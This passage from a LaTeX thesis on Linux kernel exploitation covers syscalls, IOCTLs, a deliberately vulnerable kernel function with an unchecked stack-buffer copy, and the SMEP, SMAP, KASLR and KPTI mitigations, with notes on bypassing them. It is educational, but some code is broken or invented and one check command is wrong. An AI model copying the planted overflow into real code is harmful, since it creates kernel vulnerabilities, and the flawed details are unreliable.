    Last but not least, our menu that allows us to add, edit, inspect and remove notes is inside a while true and even if the return address of main will be overwritten we will never call it.\newline
    Fortunately there is a call to exit that allows us to exit the while true and call return 0 of main which pops our shell correctly.\newline

    \chapter{Stack buffer overflow in the linux kernel}
    \section{Kernel Linux internals}
    \paragraph{Linux background}
    In 1991, Linus Torvalds, a Finnish student, developed Linux as a kernel for a new operating system. Based on Unix and distributed under an open source license, Linux quickly attracted the attention of the computing community. \newline
    Its collaborative development model has led to widespread adoption in industries such as servers, embedded devices, and desktops.\newline
    The most popular distributions of Linux have made Linux a popular choice for a wide range of computing uses.\newline
    \paragraph{Architecture}
    \subparagraph{monolithic kernel}
    Linux is a monolothic kernel therefore designed as a single module that manages all the functionality of the operating system.\newline
    This implies that all external drivers must also have some part running in kernel mode.\newline
    \subparagraph{User space and kernel space}
    The memory inside the kernel is divided into various parts,as user space and kernel space.\newline
    User space is that portion of memory with which the user interfaces, therefore that memory where all the processes generated by the user operate, in this region the permissions will be limited.\newline
    Instead, the kernel space is a privileged area where the kernel has complete and direct access to all hardware resources.\newline
    Critical operations for the operation of the system are carried out in this region.\newline
    The kernel space is inaccessible directly from users and user applications.\newline
    The only way to communicate between user space and kernel space is through system calls that allow the user to request kernel services.\newline
    \subparagraph{Linux kernel modes}
    In the paragraphs above, some Linux kernel modes have already been mentioned, in fact in order to manage permissions and memory sections correctly there are various modes in which the kernel operates.\newline
    Some of these are User mode, Kernel mode, Long mode, Protected mode and many others.\newline
    In this thesis the modes that will interest us most will be:\newline
    \begin{itemize}
        \item[$\bullet$] Kernel mode
        \item[$\bullet$] User mode
    \end{itemize}
    kernel mode: In this mode the kernel has full access to hardware resources and system privileges.\newline
    It is used to execute kernel code and to perform operations that require elevated privileges such as memory and device management.\newline
    User mode: Code that runs in this mode has limited privileges and does not have direct access to memory and hardware resources, but most applications are run in this mode.\newline
    \subparagraph{Talking to the Linux kernel}
    As we have just explained, there are various modes and many types of memory sections, but in the context of exploitation we are interested in analyzing functions that we can achieve so as to trigger bugs and exploit them.\newline
    So saying, it is essential to understand how a userspace program communicates with the kernel.
    There are many modalities, the ones we will analyze today will be:\newline
    \begin{itemize}
        \item[$\bullet$] Syscalls
        \item[$\bullet$] Pseudo-device
        \begin{itemize}
            \item[$\circ$] IOCTLs
        \end{itemize}
        \item[$\bullet$] copy\_to\_user and copy\_from\_user

    \end{itemize}
    \clearpage
    Syscall: 
    Syscalls or system calls have the task of requesting services from the kernel such as file management, process creation, hardware management and many other things.\newline
    Communication between user space and kernel space occurs according to some points:\newline
    \begin{itemize}
    \item Request from User Space: A user program requests sends a service request to the kernel via a syscall, the call can be called from an ELF executable for example.\newline
    \item Passing parameters:The syscall specifications are defined in the registers as rax (defines the syscall number), rdi (usually a pointer to the file descriptor) and so for each syscall all registers have an identifier.\newline
    \item Kernel Space transition and syscall management: At this point, based on the parameters passed, if there are no errors, the kernel executes the system call, and if necessary returns a value.\newline
    \item Return to the User Space: As a final step, the kernel returns control to the user process.\newline
\end{itemize}
    \begin{figure}[htbp]
        \centering
        \includegraphics[width=0.8\linewidth]{syscall.png}
        \caption{System calls}
        \label{fig:enter-label}
    \end{figure}
    \clearpage
    Pseudo-Device:Pseudo-devices are virtual devices that provide a user interface for accessing specific kernel functionality, are usually exposed under /dev /proc.\newline
    They support operations such as reading and writing and many others.
    An example is:
    \begin{verbatim}
        int main(){

    IOCTLs: stands for input/output control and is nothing more than a system call for a specific device that implements an operation that cannot be expressed by a regular semantic file.\newline
    Like a normal system call it requires parameters and will subsequently communicate with the kernel like a normal syscall.\newline
    An IOCTL example follows: 
    \begin{verbatim}
        #include <sys/ioctl.h> 
        #define IOCTL_READ 0x1 
        typedef struct arg { 
            char *msg; 
            size_t len;
         } arg_t; 
        int main() { 
            int fd = open("/dev/hello", O_RDWR); 
            if (fd == -1) { 
                perror("open()"); 
                exit(1); 
            } 
            int len = 20; 
            char *buf = calloc(len, sizeof(char)); 
            arg_t args = { 
                .msg = buf, 
                .len = len 
            }; 
            ioctl(fd, IOCTL_READ, &args); 
            printf("read: %s\n", args.msg); 
            close(fd); 
            free(buf); 
            return 0; 
         }
    
    \end{verbatim}

    \section{how it works a kernel stack buffer overflow in the linux kernel}
    Buffer overflow on the Linux kernel follows the logic of normal stack buffer overflow in user memory.
    A buffer overflow on the kernel occurs when we can write more input than the buffer that the program makes available can contain.\newline    
    \begin{verbatim}
    int unsafe_function(void) {
      char buffer[16];
      int ret;
      struct file *file = filp_open("/path/to/file", O_RDONLY, 0);
      if (IS_ERR(file)) {
            printk(KERN_ERR "Error   opening file\n");
            return PTR_ERR(file);
      }
      ret = copy_from_user_n(buffer, file->f_dentry->d_inode->i_private, len);
          if (ret < 0) {
            printk(KERN_ERR "Failed copy\n");
            filp_close(file);
        return ret;
      } 
      filp_close(file);
    
      return 0;
}    
    \end{verbatim}
    The code above may be vulnerable, in fact in the call to copy\_from\_user the size of the second argument buffer is not checked, if by chance this buffer exceeds sixteen characters a buffer overflow will occur on the kernel.\newline
    The technique of exploiting a buffer overflow within the kernel is similar to that seen in the second chapter except that we are in a different structure and we have new mitigations that will be explained later.\newline

    \section{mitigations}
    The Linux kernel is vital for all Linux-based systems. However, due to its extensive codebase, numerous bugs are continually being identified by researchers. To address this, the Linux kernel incorporates multiple mitigations, making exploitation techniques significantly challenging.\newline
    In this chapter we will examine some of the main mitigations present in the Linux kernel, including:
    \begin{itemize}
        \item[$\bullet$] SMEP (Supervisor Mode Execution Prevention)
        \item[$\bullet$] SMAP (Supervisor Mode Access Prevention) 
        \item[$\bullet$] KASLR (Kernel Address Space Layout Randomization)   
        \item[$\bullet$] KPTI (Kernel Page Table Isolation).\newline 
    \end{itemize}
    We'll see how these mitigations work together to fight against attackers.\newline
    Additionally, critical issues and how these mitigations can be bypassed will be discussed.\newline
    \subsection{SMEP}

    \paragraph{User space and Kernel space}

   SMEP mitigation in the Linux kernel is a key response to thwarting vulnerabilities and cyberattacks that seek to execute user code within the kernel's privileged space. Implemented as a preventative measure, SMEP helps strengthen the security of the Linux operating system by restricting the execution of user code in the context of the kernel, but before talking about this mitigation we need to specify some Linux kernel internals.\newline
    SMEP's main job is to make user space memory pages non-executable while the process is in kernel mode. Inside the Linux kernel smep can be activated by setting the twentieth bit to 1 of the CR4 control register.\newline
    SMEP making the stack non-executable is very reminiscent of nx mitigation explained in the second chapter.\newline
    To bypass SMEP we will have to write a ROP instead of using a shellcode.\newline 
    To check if the mitigation is active just run the following commands: \newline
        \begin{verbatim}
        command:
            grep -o smep /proc/cpuinfo
        output: 
            smep
    \end{verbatim}
    \subsection{SMAP}
    SMAP (Supervisor Mode Access Prevention) is one of the main mitigation of the Linux kernel, we will also interface with this mitigation after in the exploiting phase.\newline
    The task of this mitigation is to marks all user space pages as inaccessible when the process is in kernel mode, and prevents kenel space from reading or writing user space memory.\newline
    SMAP In the linux kernel is enabled by setting the twenty-first bit of Control Register CR4.\newline
    To check if the mitigation is active just run the following commands: \newline
      \begin{verbatim}
        command:
            grep -o smap /proc/cpuinfo
        output: 
            smap
    \end{verbatim}
    \subsection{kaslr}

    As we saw previously in the Stack Buffer Overflow chapter, stack randomization is carried out by ASLR, even in the Linux kernel there is an address randomization that prevents sensitive data from being called directly, this is called KASLR. \newline
    KASLR as ASLR for the stack, randomize the addresses  of the code and data sections of the linux kernel and device drivers.\newline
    Unlike aslr which randomizes memory sections every time a program is started in userspace, the linux kernel cannot shut down after the power-on phase, so KASLR will randomize addresses once after the boot phase.\newline
    Consequently, if we manage to leak an address after booting the kernel, the randomization will always be the same.\newline
    Since the beginning of 2020, a new version of kaslr has been released and it is called FGKASLR, which stand for Functions Granular Kernel Address Space Layout Randomization.\newline 
    This is a technology that randomizes addresses for each function in the Linux kernel.\newline 
    Although the address of a function in the Linux kernel can be leaked, it is not possible to determine the base address, the only way to leak the base is to extrapolate a pointer to the data section, in fact this is not randomized and allows you to find the base address.\newline
    an example of the randomization follows, in all cases I executed the command cat proc/kallsyms | grep commit\_creds we will discover later in the thesis that this address will be very useful to us:\newline
    \begin{verbatim}
    KASLR disabled 
        0xffffffff814c6410
    first case KASLR enable  
        0xffffffffaf7e4640
    second case KASLR enable
        0xffffffff84349500
    \end{verbatim}
    As we can see from the example above, kaslr only randomizes the last 8 nibbles and therefore the last 4 bytes, however KASLR will be impossible to brute because unlike ASLR if the kernel panics during the brute force we will lose all the brute work we have done up until now to kernel panic.\newline
    To check if the mitigation is active just run the following commands: \newline
    \begin{verbatim}
    command:
        sysctl kernel.randomize_va_space                  
    output:
        kernel.randomize_va_space = 2

    \end{verbatim}
    \clearpage
    \subsection{kpti}
    KPTI (kernel page table isolation) or the old name KAISER (short for Kernel Address Isolation to have Side-channels Efficiently Removed) is a mitigation that was introduced in 2018 after a very famous hardware attack called meltdown.\newline
    The meltdown attack allowed you to read the kernel memory with user privileges allowing you to simply bypass KASLR, which is why the KPTI mitigation was born.\newline
    As you know, a page table is used when converting a virtual address to a physical address, and this security mechanism separates this page table between user mode and kernel mode.\newline
    The implementation of kpti led to a notable drop in performance and worse memory management.\newline
    Below is a photo that explains memory management with kpti active: \newline
